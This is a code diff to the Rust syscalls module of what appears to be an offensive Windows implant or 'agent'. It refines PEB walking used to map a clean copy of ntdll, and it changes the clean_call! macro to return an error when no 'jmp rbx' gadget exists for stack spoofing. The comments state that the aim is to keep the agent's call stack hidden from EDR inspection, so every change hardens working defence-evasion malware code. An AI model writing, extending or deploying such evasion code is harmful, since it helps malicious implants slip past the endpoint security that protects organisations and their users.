@@ -67,6 +67,94 @@ pub struct SyscallTarget {
     pub gadget_addr: usize,
 }
 
+/// Byte offsets used when walking the PEB → Ldr → InMemoryOrderModuleList.
+///
+/// All values are offsets *from the start of the `InMemoryOrderLinks` pointer*
+/// (i.e. from the list-entry cursor, which points at
+/// `LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks`).
+///
+/// Default values are derived from the x64 Windows 10/11 `ntdll` LDR layout,
+/// which has been stable since Windows Vista for 64-bit processes.  A future
+/// Windows version that changes the layout will only need to update these
+/// constants (or the `get_peb_offsets` resolver).
+#[cfg(windows)]
+#[derive(Clone, Copy, Debug)]
+struct PebOffsets {
+    /// Byte delta from `&entry.InMemoryOrderLinks` to `entry.DllBase`.
+    /// Win10/11 x64: LDR_DATA_TABLE_ENTRY.DllBase @ +0x30, InMemoryOrderLinks @ +0x10 → delta 0x20.
+    dll_base_from_imol: usize,
+    /// Byte delta from `&entry.InMemoryOrderLinks` to `entry.FullDllName`.
+    /// Win10/11 x64: FullDllName @ +0x48, InMemoryOrderLinks @ +0x10 → delta 0x38.
+    full_dll_name_from_imol: usize,
+}
+
+#[cfg(windows)]
+impl Default for PebOffsets {
+    fn default() -> Self {
+        // Derived from #[repr(C)] LDR_DATA_TABLE_ENTRY layout below:
+        //   InLoadOrderLinks      @ +0x00  (LIST_ENTRY = 16 bytes on x64)
+        //   InMemoryOrderLinks    @ +0x10  (16 bytes)
+        //   InInitOrderLinks      @ +0x20  (16 bytes)
+        //   DllBase               @ +0x30  (*mut c_void = 8 bytes)
+        //   EntryPoint            @ +0x38  (8 bytes)
+        //   SizeOfImage           @ +0x40  (u32, 4 bytes + 4 pad)
+        //   FullDllName           @ +0x48  (UNICODE_STRING = 16 bytes on x64)
+        //   BaseDllName           @ +0x58  (UNICODE_STRING = 16 bytes on x64)
+        Self {
+            dll_base_from_imol: 0x30 - 0x10,      // 0x20
+            full_dll_name_from_imol: 0x48 - 0x10,  // 0x38
+        }
+    }
+}
+
+#[cfg(windows)]
+static PEB_OFFSETS: OnceLock<PebOffsets> = OnceLock::new();
+
+/// Return a reference to the cached PEB offsets, initialising on first call.
+///
+/// Initialisation derives the offsets from the compile-time `#[repr(C)]`
+/// `LDR_DATA_TABLE_ENTRY` layout.  If that cannot be verified (e.g. the sizes
+/// do not match expectations) the Win10/11 x64 defaults are returned, which
+/// are the same values — this path exists for forward-compatibility.
+#[cfg(windows)]
+fn get_peb_offsets() -> &'static PebOffsets {
+    PEB_OFFSETS.get_or_init(|| {
+        // Derive from the struct defined in this file.  If the constants match
+        // the defaults we know they are correct for the running platform.
+        let imol_offset = {
+            // offsetof!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
+            // InLoadOrderLinks is a LIST_ENTRY (2 × *mut LIST_ENTRY = 16 bytes on x64)
+            std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>()
+        };
+        let dll_base_offset = imol_offset
+            + std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>()  // InMemoryOrderLinks
+            + std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>(); // InInitializationOrderLinks
+        let full_name_offset = dll_base_offset
+            + std::mem::size_of::<*mut std::os::raw::c_void>()  // DllBase
+            + std::mem::size_of::<*mut std::os::raw::c_void>()  // EntryPoint
+            + std::mem::size_of::<u64>();                        // SizeOfImage (u32 + 4-byte pad)
+
+        let defaults = PebOffsets::default();
+        // Sanity-check: if computed offsets differ from Win10/11 defaults, fall back.
+        if dll_base_offset - imol_offset == defaults.dll_base_from_imol
+            && full_name_offset - imol_offset == defaults.full_dll_name_from_imol
+        {
+            PebOffsets {
+                dll_base_from_imol: dll_base_offset - imol_offset,
+                full_dll_name_from_imol: full_name_offset - imol_offset,
+            }
+        } else {
+            tracing::warn!(
+                "PEB offsets from struct layout (dll_base={:#x}, full_name={:#x}) differ from \
+                 Win10/11 defaults; using defaults",
+                dll_base_offset - imol_offset,
+                full_name_offset - imol_offset,
+            );
+            defaults
+        }
+    })
+}
+
 #[cfg(windows)]
 fn rva_to_offset(
     rva: u32,
@@ -200,10 +288,14 @@ fn map_clean_ntdll() -> Result<usize> {
             // First entry is usually the executable, second is ntdll
             while curr != head {
                 let entry = curr as *const u8;
-                // InMemoryOrder links are at offset 0x10 compared to LDR_DATA_TABLE_ENTRY base
-                let dll_base_ptr = entry.add(0x30 - 0x10) as *const *mut std::os::raw::c_void;
-                let full_name_ptr =
-                    entry.add(0x48 - 0x10) as *const winapi::shared::ntdef::UNICODE_STRING;
+                // InMemoryOrder links point at LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks.
+                // Use cached PebOffsets to find DllBase and FullDllName without
+                // hardcoding magic numbers.
+                let offsets = get_peb_offsets();
+                let dll_base_ptr =
+                    entry.add(offsets.dll_base_from_imol) as *const *mut std::os::raw::c_void;
+                let full_name_ptr = entry.add(offsets.full_dll_name_from_imol)
+                    as *const winapi::shared::ntdef::UNICODE_STRING;
 
                 let base = *dll_base_ptr;
                 let name = *full_name_ptr;
@@ -896,6 +988,34 @@ unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
     0
 }
 
+/// Errors that can arise from the `clean_call!` macro.
+///
+/// Callers must handle each variant explicitly — in particular, `NoGadgetAvailable`
+/// must never be silently ignored since it means the call will be made without
+/// stack spoofing, fully exposing the agent's call stack to EDR inspection.
+#[cfg(windows)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum SyscallError {
+    /// No `jmp rbx` (or equivalent) gadget was found in any mapped system DLL.
+    /// Proceeding with a raw un-spoofed call is a deliberate security trade-off
+    /// that the caller must accept explicitly.
+    NoGadgetAvailable,
+}
+
+#[cfg(windows)]
+impl std::fmt::Display for SyscallError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            SyscallError::NoGadgetAvailable => {
+                write!(f, "no jmp-rbx gadget found; stack spoofing unavailable")
+            }
+        }
+    }
+}
+
+#[cfg(windows)]
+impl std::error::Error for SyscallError {}
+
 #[cfg(windows)]
 pub fn get_clean_api_addr(dll_name: &str, func_name: &str) -> Result<usize> {
     let base = map_clean_dll(dll_name)?;
@@ -945,13 +1065,16 @@ macro_rules! clean_call {
 
         let gadget = $crate::syscalls::find_jmp_rbx_gadget();
         if gadget == 0 {
-            // fallback if no gadget found
-            let func: $fn_type = unsafe { std::mem::transmute(addr) };
-            unsafe { func($($args),*) }
+            // No stack-spoofing gadget is available.  Refuse to silently fall
+            // back to a raw un-spoofed transmute-call: doing so would expose
+            // the full agent call stack to EDR inspection without any warning.
+            // The caller must handle this error explicitly and decide whether
+            // to attempt a different gadget search, accept the risk, or abort.
+            Err($crate::syscalls::SyscallError::NoGadgetAvailable)
         } else {
             let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
             // cast result back
-            unsafe { $crate::syscalls::bounded_transmute(res) }
+            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
         }
     }};
 }
